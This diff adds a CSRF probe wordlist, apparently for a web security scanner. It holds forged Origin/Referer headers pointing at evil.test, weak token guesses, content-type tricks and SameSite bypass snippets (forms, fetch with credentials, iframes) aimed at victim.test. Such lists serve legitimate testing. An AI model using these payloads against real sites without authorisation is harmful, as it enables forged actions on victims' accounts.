@@ -1,0 +1,73 @@
+# category: csrf
+# description: CSRF / SameSite / anti-CSRF-token probes — missing / weak / recycled / predictable.
+# references: OWASP CSRF, PortSwigger CSRF labs.
+
+# ── Common CSRF header names worth stripping/forging ─────────────────────
+X-Csrf-Token:
+X-Csrf-Token: 0
+X-Csrf-Token: null
+X-Csrf-Token: undefined
+X-Csrf-Token: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+X-CSRFToken:
+X-XSRF-TOKEN:
+X-XSRF-TOKEN: 0
+X-Requested-With:
+X-Requested-With: XMLHttpRequest
+X-Requested-With: XSRF
+Origin:
+Origin: null
+Origin: https://evil.test
+Referer:
+Referer: https://evil.test
+Referer: http://127.0.0.1
+Referer: https://victim.test/
+
+# ── Common token parameter names ─────────────────────────────────────────
+csrf=
+csrf_token=
+_csrf=
+_csrf_token=
+authenticity_token=
+anti_csrf_token=
+__RequestVerificationToken=
+csrfmiddlewaretoken=
+nonce=
+token=
+state=
+_wpnonce=
+xsrf=
+
+# ── Weak token patterns to try ───────────────────────────────────────────
+csrf=0000000000000000
+csrf=aaaaaaaaaaaaaaaa
+csrf=undefined
+csrf=null
+csrf=true
+csrf=false
+csrf=123
+csrf=test
+csrf=testtesttest
+csrf=admin
+csrf=camio
+
+# ── JSON-content-type to break CSRF defenses ─────────────────────────────
+Content-Type: application/json
+Content-Type: text/plain
+Content-Type: application/csv
+Content-Type: image/jpeg
+Content-Type: text/html
+Content-Type: application/xml
+
+# ── SameSite bypass hints ────────────────────────────────────────────────
+<form method=POST action="https://victim.test/action"><input type=hidden name=x value=1></form>
+window.open('https://victim.test/action?x=1')
+fetch('https://victim.test/action',{credentials:'include',method:'POST',mode:'no-cors'})
+<iframe src="https://victim.test/action?x=1"></iframe>
+<link rel=prerender href="https://victim.test/action?x=1">
+<a target=_blank href="https://victim.test/action?x=1">click</a>
+
+# ── Method-override CSRF ─────────────────────────────────────────────────
+_method=PUT
+_method=DELETE
+X-HTTP-Method: DELETE
+X-HTTP-Method-Override: DELETE
